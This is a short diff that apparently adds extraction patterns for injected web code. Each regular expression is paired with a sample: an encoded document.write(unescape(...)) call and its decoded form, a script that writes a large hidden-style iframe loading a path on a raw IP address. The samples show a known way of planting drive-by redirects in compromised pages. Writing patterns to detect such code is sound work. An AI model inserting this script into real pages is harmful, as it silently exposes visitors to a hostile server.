@@ -1,0 +1,7 @@
+regular_expression --> .+unescape\("(.+)"\)\);
+document.write(unescape("%09%3Cscript%20language%3D%22JavaScript%22%3E%20%0A%09document.write%28%27%3Ciframe%20src%3D%22http%3A%2F%2F204.12.52.120%2Fhm3488746%2F%22%20%20height%3D%221300%22%20width%3D%22820%22%20frameborder%3D%220%22%20scrolling%3D%22auto%22%20%20target%3D%22_blank%22%3E%3C%2Fiframe%3E%27%29%3B%0A%09%3C%2Fscript%3E%0A"));
+
+regular_expession --> .*\n.*iframe src="(.+)"  height=.*\n.*
+	<script language="JavaScript"> 
+		document.write('<iframe src="http://204.12.52.120/hm3488746/"  height="1300" width="820" frameborder="0" scrolling="auto"  target="_blank"></iframe>');
+	</script>
